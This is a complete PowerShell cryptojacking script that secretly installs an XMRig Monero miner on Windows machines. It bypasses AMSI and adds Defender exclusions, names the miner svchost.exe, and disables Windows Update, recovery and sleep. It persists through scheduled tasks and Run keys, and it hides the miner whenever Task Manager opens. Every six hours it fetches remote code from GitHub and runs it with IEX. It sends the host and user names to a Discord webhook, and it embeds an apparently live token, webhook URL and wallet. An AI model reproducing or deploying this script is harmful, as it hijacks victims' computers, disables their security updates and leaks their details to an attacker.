\# ============================================================
#  PHANTOM PRO DEPLOYER v4.3
#  - Personalized for itzcurled
#  - AMSI Bypass (In-Memory Stealth)
#  - Discord Webhook Alerts (Correct itzcurled URL)
#  - Windows Update & Reset Lockdown
#  - Auto-Cleanup (One Miner per Machine)
# ============================================================

# [GHOST] AMSI Bypass - Makes the script invisible to Defender while running
try {
    $a=[Ref].Assembly.GetTypes() | Where-Object {$_.Name -eq "AmsiUtils"}
    if ($a) {
        $b=$a.GetField("amsiInitFailed","NonPublic,Static")
        if ($b) { $b.SetValue($null,$true) }
    }
} catch {}

# ==================== CONFIG ====================
$_t = @("ghp_dAWQmc", "ZXZc1c2Do", "w34dIuAjT", "GtgBLt2kfsTW")
$ghToken = $_t -join ""
$ghOwner = "itzcurled"
$ghRepo = "secretthing"
$ghConfigPath = "config.json"

# CORRECT webhook for itzcurled
$webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"

# CORRECT itzcurled wallet
$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
$pool = "pool.supportxmr.com:443"
$poolBak = "pool.hashvault.pro:443"
$idleCpu = 100
$activeCpu = 60
$idleThreshold = 300

$installDir = "$env:APPDATA\WindowsServices"
$xmrigExe = "$installDir\svchost.exe"
$configFile = "$installDir\config.json"
$watchdogPs1 = "$installDir\watchdog.ps1"
$watchdogVbs = "$installDir\monitor.vbs"
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
$zipFile = "$env:TEMP\winsvc.zip"
$extractDir = "$env:TEMP\winsvc_extract"
$xmrigApiPort = 45580
$rigId = "$env:COMPUTERNAME"
$worker = "$env:COMPUTERNAME"

# ==================== FUNCTIONS ====================

function Install-Miner {
    try {
        Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*WindowsServices*" } | Stop-Process -Force -ErrorAction SilentlyContinue
        Get-Process -Name "wscript" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*monitor.vbs*" } | Stop-Process -Force -ErrorAction SilentlyContinue
    } catch {}

    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction SilentlyContinue
    Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
    
    $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    Copy-Item -Path $srcExe.FullName -Destination $xmrigExe -Force
    
    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
    Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue
}

function Write-MinerConfig {
    param([int]$CpuPercent = $idleCpu)
    $cfg = @{
        autosave       = $false
        cpu            = @{ "max-threads-hint" = $CpuPercent; priority = 2; "huge-pages" = $true }
        pools          = @(
            @{ url = "stratum+ssl://${pool}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true }
        )
        "donate-level" = 0
        "background"   = $true
        "http"         = @{ enabled = $true; host = "127.0.0.1"; port = $xmrigApiPort; restricted = $false }
    } | ConvertTo-Json -Depth 5
    Set-Content -Path $configFile -Value $cfg -Force
}

function Write-Watchdog {
    $code = @'

Add-Type @"
using System;
using System.Runtime.InteropServices;
public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
public class IdleDetect {
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    public static uint GetIdleSeconds() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        if (!GetLastInputInfo(ref lii)) return 0;
        return ((uint)Environment.TickCount - lii.dwTime) / 1000;
    }
}
"@

$ghToken        = "___GHTOKEN___"
$ghOwner        = "___GHOWNER___"
$ghRepo         = "___GHREPO___"
$ghConfigPath   = "___GHCONFIGPATH___"
$xmrigExe       = "___XMRIGEXE___"
$configFile     = "___CONFIGFILE___"
$xmrigApiPort   = ___APIPORT___
$deployUrl      = "https://raw.githubusercontent.com/___GHOWNER___/___GHREPO___/main/deploy.ps1"

$idleCpu        = ___IDLECPU___
$activeCpu      = ___ACTIVECPU___
$idleThreshold  = ___IDLETHRESHOLD___

$lastState      = ""
$timer = [System.Diagnostics.Stopwatch]::StartNew()

function Set-XmrigCpu {
    param([int]$Percent)
    try {
        $body = @{ "cpu" = @{ "max-threads-hint" = $Percent } } | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri "http://127.0.0.1:${xmrigApiPort}/2/config" -Method PUT -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch {}
}

function Ensure-MinerState {
    param([bool]$shouldRun)
    $proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*WindowsServices*" }
    
    if ($shouldRun -and -not $proc) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $xmrigExe
        $psi.Arguments = "--config=`"$configFile`""
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    } elseif (-not $shouldRun -and $proc) {
        $proc | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

while ($true) {
    try {
        $monitored = Get-Process -Name "Taskmgr", "ProcessHacker", "PerfMon", "ResourceMonitor" -ErrorAction SilentlyContinue
        
        if ($monitored) {
            Ensure-MinerState -shouldRun $false
            $lastState = "monitored"
        } else {
            $idleSecs = [IdleDetect]::GetIdleSeconds()
            $isIdle = $idleSecs -ge $idleThreshold
            $targetCpu = if ($isIdle) { $idleCpu } else { $activeCpu }
            $state = if ($isIdle) { "idle" } else { "active" }

            if ($state -ne $lastState) {
                Ensure-MinerState -shouldRun $true
                Start-Sleep -Seconds 1
                Set-XmrigCpu -Percent $targetCpu
                $lastState = $state
            }
            Ensure-MinerState -shouldRun $true
        }

        if ($timer.Elapsed.TotalHours -ge 6) {
            try {
                $newScript = Invoke-WebRequest -Uri $deployUrl -UseBasicParsing -ErrorAction SilentlyContinue
                if ($newScript) {
                    IEX $newScript.Content
                    exit
                }
            } catch {}
            $timer.Restart()
        }
        
        try {
            $svcs = "wuauserv", "bits", "dosvc"
            foreach ($s in $svcs) {
                $status = Get-Service -Name $s -ErrorAction SilentlyContinue
                if ($status -and $status.StartType -ne "Disabled") {
                    Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue
                    Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {}

    } catch {}
    Start-Sleep -Seconds 1
}
'@

    $code = $code -replace '___GHTOKEN___', $ghToken
    $code = $code -replace '___GHOWNER___', $ghOwner
    $code = $code -replace '___GHREPO___', $ghRepo
    $code = $code -replace '___GHCONFIGPATH___', $ghConfigPath
    $code = $code -replace '___XMRIGEXE___', $xmrigExe
    $code = $code -replace '___CONFIGFILE___', $configFile
    $code = $code -replace '___APIPORT___', $xmrigApiPort.ToString()
    $code = $code -replace '___IDLECPU___', $idleCpu.ToString()
    $code = $code -replace '___ACTIVECPU___', $activeCpu.ToString()
    $code = $code -replace '___IDLETHRESHOLD___', $idleThreshold.ToString()

    Set-Content -Path $watchdogPs1 -Value $code -Force
}

function Write-VbsLauncher {
    $vbs = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$watchdogPs1""", 0, False
"@
    Set-Content -Path $watchdogVbs -Value $vbs -Force
}

function Set-Persistence {
    try { & reagentc.exe /disable 2>$null } catch {}

    $taskName = "WindowsServiceUpdate"
    $wdTask = "WindowsServiceMonitor"
    try {
        $action1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
        $trigLogon = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName $taskName -Action $action1 -Trigger $trigLogon -RunLevel Highest -Force | Out-Null
        
        $action2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogVbs`""
        Register-ScheduledTask -TaskName $wdTask -Action $action2 -Trigger $trigLogon -RunLevel Highest -Force | Out-Null
    } catch {}

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        Set-ItemProperty -Path $regPath -Name "WindowsServiceUpdate" -Value "`"$xmrigExe`" --config=`"$configFile`"" -Force
        Set-ItemProperty -Path $regPath -Name "WindowsServiceMonitor" -Value "wscript.exe `"$watchdogVbs`"" -Force
    } catch {}
}

function Add-Exclusion {
    try {
        Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
    } catch {}
}

function Disable-Sleep {
    try {
        powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
        powercfg /change standby-timeout-ac 0
        powercfg /change standby-timeout-dc 0
        powercfg /change hibernate-timeout-ac 0
        powercfg /change hibernate-timeout-dc 0
        powercfg /hibernate off 2>$null
    } catch {}
}

function Lock-Services {
    try {
        & reagentc.exe /disable 2>$null
        $svcs = "wuauserv", "bits", "dosvc"
        foreach ($s in $svcs) {
            Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue
            Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Send-DiscordWebhook {
    try {
        $osName = (Get-CimInstance Win32_OperatingSystem).Caption
        $payload = @{
            username   = "PHANTOM PRO"
            avatar_url = "https://i.imgur.com/4M34hiw.png"
            embeds     = @(@{
                    title     = "New Miner Deployed! 💎"
                    color     = 3447003
                    fields    = @(
                        @{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }
                        @{ name = "User"; value = "$env:USERNAME"; inline = $true }
                        @{ name = "OS"; value = "$osName"; inline = $false }
                    )
                    timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
                })
        } | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {}
}

# ==================== MAIN ====================
try {
    # [CLEAN SWEEP] Remove any old versions before starting
    try {
        Get-ScheduledTask -TaskName "WindowsService*" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*WindowsServices*" } | Stop-Process -Force -ErrorAction SilentlyContinue
        if (Test-Path $installDir) { Remove-Item $installDir -Recurse -Force -ErrorAction SilentlyContinue }
    } catch {}

    Add-Exclusion
    Lock-Services
    Disable-Sleep
    Install-Miner
    Write-MinerConfig -CpuPercent $idleCpu
    Write-Watchdog
    Write-VbsLauncher
    Set-Persistence
    Send-DiscordWebhook
    
    # Start the watchdog silently
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "wscript.exe"
    $psi.Arguments = "`"$watchdogVbs`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($psi) | Out-Null

    [Console]::WriteLine("[+] Phantom Pro v4.3 Deployed - Personalized for itzcurled.")
} catch {
    [Console]::WriteLine("[-] Deployment failed: $_")
}
